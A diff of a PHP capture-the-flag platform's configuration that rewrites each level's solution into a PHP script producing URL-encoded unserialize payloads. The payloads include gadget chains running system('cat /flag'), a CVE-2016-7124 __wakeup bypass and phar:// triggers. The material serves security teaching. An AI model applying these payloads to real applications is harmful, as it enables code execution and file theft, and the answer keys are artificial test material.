@@ -41,7 +41,9 @@ return [
     ],
     'wp' => [
         'idea' => 'code 参数会被 eval 执行,直接实例化 FLAG 类触发构造函数输出 flag。',
-        'exp' => "code=new FLAG();",
+        'exp' => "<?php
+// 参考EXP:在「作答」页提交 code 参数
+echo \"code=\" . urlencode(\"new FLAG();\");",
     ],
 ],
 
@@ -62,7 +64,8 @@ return [
     ],
     'wp' => [
         'idea' => '对象属性赋值:把外部变量 $flag_string 传入 $target 的 public 属性,页面随后输出它。',
-        'exp' => "code=\$target->free_flag=\$flag_string;",
+        'exp' => "<?php
+echo \"code=\" . urlencode(\"\$target->free_flag=\$flag_string;\");",
     ],
 ],
 
@@ -84,7 +87,8 @@ return [
     ],
     'wp' => [
         'idea' => 'public 直接读,protected/private 通过类内 getter 读出三段拼合。',
-        'exp' => "code=echo \$target->public_flag.\$target->get_protected_flag().\$target->get_private_flag();",
+        'exp' => "<?php
+echo \"code=\" . urlencode(\"echo \$target->public_flag.\$target->get_protected_flag().\$target->get_private_flag();\");",
     ],
 ],
 
@@ -105,7 +109,8 @@ return [
     ],
     'wp' => [
         'idea' => 'serialize 会完整输出 private 属性,从序列化串中读出各段值拼接。',
-        'exp' => "code=echo serialize(\$flag_is_here);",
+        'exp' => "<?php
+echo \"code=\" . urlencode(\"echo serialize(\$flag_is_here);\");",
     ],
 ],
 
@@ -134,7 +139,14 @@ return [
     ],
     'wp' => [
         'idea' => '按六种类型的序列化格式逐个构造提交。',
-        'exp' => "o=O:7:\"a_class\":1:{s:7:\"a_value\";s:4:\"FLAG\";}\n&s=s:5:\"IWANT\";\n&a=a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}\n&i=i:1;&b=b:1;&n=N;",
+        'exp' => "<?php
+// 六种类型分别构造,分别提交
+echo \"o=\" . urlencode('O:7:\"a_class\":1:{s:7:\"a_value\";s:4:\"FLAG\";}'), \"\\n\";
+echo \"s=\" . urlencode('s:5:\"IWANT\";'), \"\\n\";
+echo \"a=\" . urlencode('a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}'), \"\\n\";
+echo \"i=i:1;\\n\";
+echo \"b=b:1;\\n\";
+echo \"n=N;\\n\";",
     ],
 ],
 
@@ -159,7 +171,10 @@ return [
     ],
     'wp' => [
         'idea' => '按 %00 规则手写两个序列化串,URL 编码后提交。',
-        'exp' => "protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D\n&private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D",
+        'exp' => "<?php
+// %00 是不可见字符,务必 urlencode
+echo \"protected_key=\" . urlencode(\"O:12:\\\"protectedKEY\\\":1:{s:16:\\\"\\0*\\0protected_key\\\";s:13:\\\"protected_key\\\";}\"), \"\\n\";
+echo \"private_key=\" . urlencode(\"O:10:\\\"privateKEY\\\":1:{s:23:\\\"\\0privateKEY\\0private_key\\\";s:11:\\\"private_key\\\";}\");",
     ],
 ],
 
@@ -182,7 +197,12 @@ return [
     ],
     'wp' => [
         'idea' => '反序列化 = 按字符串还原对象,flag_command 完全可控 → eval 任意命令。',
-        'exp' => "class FLAG{\n    public \$flag_command = \"system('cat /flag');\";\n}\necho urlencode(serialize(new FLAG()));",
+        'exp' => "<?php
+// 构造 FLAG 对象,让 backdoor() 执行 flag_command
+class FLAG {
+    public \$flag_command = \"system('cat /flag');\";
+}
+echo \"o=\" . urlencode(serialize(new FLAG()));",
     ],
 ],
 
@@ -204,7 +224,9 @@ return [
     ],
     'wp' => [
         'idea' => '嵌套 unserialize(serialize(...)) 制造连续的构造归位与析构累加,临时对象无引用立即回收,最终 flag 计数 > 5。',
-        'exp' => "code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));",
+        'exp' => "<?php
+// 嵌套 序列化/反序列化:构造+析构交替计数,提交到 code=
+echo \"code=\" . urlencode('unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));');",
     ],
 ],
 
@@ -225,7 +247,11 @@ return [
     ],
     'wp' => [
         'idea' => '还原 FLAG 对象,析构时 eval 执行 cat /flag。',
-        'exp' => "class FLAG {\n    var \$flag_command = \"system('cat /flag');\";\n}\necho \"o=\".urlencode(serialize(new FLAG()));",
+        'exp' => "<?php
+class FLAG {
+    var \$flag_command = \"system('cat /flag');\";
+}
+echo \"o=\" . urlencode(serialize(new FLAG()));",
     ],
 ],
 
@@ -244,7 +270,8 @@ return [
     ],
     'wp' => [
         'idea' => '空对象即可触发 __wakeup。',
-        'exp' => "o=O:4:\"FLAG\":0:{}",
+        'exp' => "<?php
+echo \"o=\" . urlencode('O:4:\"FLAG\":0:{}');",
     ],
 ],
 
@@ -261,7 +288,9 @@ return [
     ],
     'wp' => [
         'idea' => '把属性个数从 1 改成 2,触发 CVE-2016-7124 跳过 __wakeup,flag 不被置空。',
-        'exp' => "O:4:\"FLAG\":1:{s:4:\"flag\";s:8:\"FAKEFLAG\";}\n→ 把 1 改成 2:\no=O:4:\"FLAG\":2:{s:4:\"flag\";s:8:\"FAKEFLAG\";}",
+        'exp' => "<?php
+// 属性个数 1 → 2,触发 CVE-2016-7124(仅 PHP<5.6.25 / 7.0.10)
+echo \"o=\" . urlencode('O:4:\"FLAG\":2:{s:4:\"flag\";s:8:\"FAKEFLAG\";}');",
     ],
 ],
 
@@ -284,7 +313,11 @@ return [
     ],
     'wp' => [
         'idea' => '反复请求,用 chance 逐个指定属性,收集 12 段值按 h,e,l,I,o,c,t,f,f,l,a,g 顺序拼接。',
-        'exp' => "依次请求:\nLevel12/index.php?chance=h / e / l / I / o / c / t / f / a / g\n(某些字母出现两次,收集两次)\n按顺序拼接 serialize 输出中的对应值。",
+        'exp' => "<?php
+// 反复请求收集各属性值,按 h e l I o c t f f l a g 顺序拼接
+foreach (['h', 'e', 'l', 'I', 'o', 'c', 't', 'f', 'a', 'g'] as \$c) {
+    echo \"Level12/index.php?chance={\$c}\\n\";
+}",
     ],
 ],
 
@@ -304,7 +337,8 @@ return [
     ],
     'wp' => [
         'idea' => 'echo $obj 触发 __toString。',
-        'exp' => "o=echo \$obj;",
+        'exp' => "<?php
+echo \"o=\" . urlencode(\"echo \$obj;\");",
     ],
 ],
 
@@ -323,7 +357,8 @@ return [
     ],
     'wp' => [
         'idea' => '$obj("get_flag") 触发 __invoke。',
-        'exp' => "o=\$obj('get_flag');",
+        'exp' => "<?php
+echo \"o=\" . urlencode(\"\$obj('get_flag');\");",
     ],
 ],
 
@@ -342,7 +377,20 @@ return [
     ],
     'wp' => [
         'idea' => 'D(wakeup) → destnation(action) → A→B→C 三层属性链,末端 c 为命令。',
-        'exp' => "class A { public \$a; }\nclass B { public \$b; }\nclass C { public \$c; }\nclass destnation { var \$cmd; }\nclass D { public \$d; }\n\n\$c = new C(); \$c->c = \"system('cat /flag');\";\n\$b = new B(); \$b->b = \$c;\n\$a = new A(); \$a->a = \$b;\n\$des = new destnation(); \$des->cmd = \$a;\n\$d = new D(); \$d->d = \$des;\necho \"o=\".urlencode(serialize(\$d));",
+        'exp' => "<?php
+// D(__wakeup) → destnation(action) → A→B→C 属性链,末端 c 为命令
+class A { public \$a; }
+class B { public \$b; }
+class C { public \$c; }
+class destnation { public \$cmd; }
+class D { public \$d; }
+
+\$c = new C(); \$c->c = \"system('cat /flag');\";
+\$b = new B(); \$b->b = \$c;
+\$a = new A(); \$a->a = \$b;
+\$des = new destnation(); \$des->cmd = \$a;
+\$d = new D(); \$d->d = \$des;
+echo \"o=\" . urlencode(serialize(\$d));",
     ],
 ],
 
@@ -361,7 +409,15 @@ return [
     ],
     'wp' => [
         'idea' => 'INIT(wakeup/echo) → B(toString/函数调用) → A(include)。',
-        'exp' => "class A { public \$a = 'flag.php'; }\nclass B { public \$b; }\nclass INIT { public \$name; }\n\n\$b = new B(); \$b->b = new A();\n\$i = new INIT(); \$i->name = \$b;\necho \"o=\".urlencode(serialize(\$i));",
+        'exp' => "<?php
+// INIT(wakeup/echo) → B(toString/函数调用) → A(include)
+class A { public \$a = 'flag.php'; }
+class B { public \$b; }
+class INIT { public \$name; }
+
+\$b = new B(); \$b->b = new A();
+\$i = new INIT(); \$i->name = \$b;
+echo \"o=\" . urlencode(serialize(\$i));",
     ],
 ],
 
@@ -381,7 +437,8 @@ return [
     ],
     'wp' => [
         'idea' => '序列化字符串优先于类定义,还原后属性"无中生有"。',
-        'exp' => "o=O:1:\"A\":1:{s:11:\"helloctfcmd\";s:8:\"get_flag\";}",
+        'exp' => "<?php
+echo \"o=\" . urlencode('O:1:\"A\":1:{s:11:\"helloctfcmd\";s:8:\"get_flag\";}');",
     ],
 ],
 
@@ -405,7 +462,8 @@ return [
     ],
     'wp' => [
         'idea' => '两次替换:Demo→FLAG、20→8,利用 ;} 尾部判定截断。',
-        'exp' => "Level18/index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8",
+        'exp' => "<?php
+echo \"Level18/index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8\\n\";",
     ],
 ],
 
@@ -430,7 +488,12 @@ return [
     ],
     'wp' => [
         'idea' => 'a 中 getflag 被删导致声明长度"读多",吞掉真实 b 的结构,边界对齐 b 中注入的伪造属性。',
-        'exp' => "a=getflaggetflaggetflaggetflaggetflaggetflag\n&b=FFFFFFFFFFFFFFFF\";s:10:\"helloctf_b\";s:8:\"get_flag\";}",
+        'exp' => "<?php
+// a 的 6 个 getflag(42 字符)被过滤删除,声明长度不变 → 解析器多读 42 字符,
+// 恰好吞掉 \" ; s:10:\"helloctf_b\" ; s:52:\" 和 16 个 F,b 中的注入结构顶替真属性
+\$a = str_repeat('getflag', 6);
+\$b = str_repeat('F', 16) . '\";s:10:\"helloctf_b\";s:8:\"get_flag\";}';
+echo \"a=\" . urlencode(\$a) . \"&b=\" . urlencode(\$b);",
     ],
 ],
 
@@ -455,7 +518,11 @@ return [
     ],
     'wp' => [
         'idea' => 'b 中 x 膨胀使实际内容超出声明长度,解析在声明长度处截断,溢出部分被当作下一个属性解析。',
-        'exp' => "a=xxxxxx\";s:10:\"helloctf_b\";s:8:\"get_flag\";}JJJJJJ\n&b=BBB",
+        'exp' => "<?php
+// a 的 6 个 x 膨胀为 48 字符,恰好填满声明长度;注入结构溢出为第二个属性
+\$a = str_repeat('x', 6) . '\";s:10:\"helloctf_b\";s:8:\"get_flag\";}JJJJJJ';
+\$b = 'BBB';
+echo \"a=\" . urlencode(\$a) . \"&b=\" . urlencode(\$b);",
     ],
 ],
 
@@ -476,7 +543,16 @@ return [
     ],
     'wp' => [
         'idea' => '用序列化引用 R 把两个属性指向同一存储,wakeup 刷新后依然相等。',
-        'exp' => "class FLAG {\n    public \$tj_token;\n    public \$helloctf_token;\n}\n\$o = new FLAG();\n\$o->tj_token = 1;\n\$o->helloctf_token = &\$o->tj_token;\necho urlencode(serialize(\$o));\n// O:4:\"FLAG\":2:{s:8:\"tj_token\";i:1;s:14:\"helloctf_token\";R:2;}",
+        'exp' => "<?php
+// R:2 引用让两个属性共享存储,__wakeup 刷新后依然相等
+class FLAG {
+    public \$tj_token;
+    public \$helloctf_token;
+}
+\$o = new FLAG();
+\$o->tj_token = 1;
+\$o->helloctf_token = &\$o->tj_token;
+echo \"o=\" . urlencode(serialize(\$o));",
     ],
 ],
 
@@ -497,7 +573,9 @@ return [
     ],
     'wp' => [
         'idea' => 'php_serialize 把整个 payload 存成一个字符串值;php 处理器按第一个 | 切分,| 后被当作序列化值反解出 FLAG 对象。',
-        'exp' => "?a=%7CO%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A7%3A%22tj_name%22%3Bs%3A8%3A%22get_flag%22%3B%7D",
+        'exp' => "<?php
+// | 开头:读取侧按 php 处理器切分后,| 之后被当作序列化值反解
+echo \"?a=\" . urlencode('|O:4:\"FLAG\":1:{s:7:\"tj_name\";s:8:\"get_flag\";}');",
     ],
 ],
 
@@ -517,7 +595,9 @@ return [
     ],
     'wp' => [
         'idea' => 'is_dir(phar://helloctf.phar) 触发 metadata 反序列化,FLAG 对象析构时 eval 命令。',
-        'exp' => "?file=phar://helloctf.phar",
+        'exp' => "<?php
+// is_dir 触碰 phar:// 流 → metadata 反序列化 → 析构执行命令
+echo \"?file=\" . urlencode('phar://helloctf.phar');",
     ],
 ],
 
@@ -539,7 +619,10 @@ return [
     ],
     'wp' => [
         'idea' => 'DirectoryIterator 列目录定位 flag 文件,SplFileObject 读取内容,echo 触发 __toString。',
-        'exp' => "第一步 payload:\nO:7:\"TJ_ITER\":1:{s:19:\"probiusofficial_path\";s:1:\".\";}\n第二步 payload:\nO:15:\"HELLOCTF_READER\":1:{s:7:\"tj_file\";s:8:\"flag.php\";}",
+        'exp' => "<?php
+// 第一步:TJ_ITER 列目录(把下面换成 TJ_ITER 串);
+// 第二步:HELLOCTF_READER 读文件
+echo \"o=\" . urlencode('O:15:\"HELLOCTF_READER\":1:{s:7:\"tj_file\";s:8:\"flag.php\";}');",
     ],
 ],
 
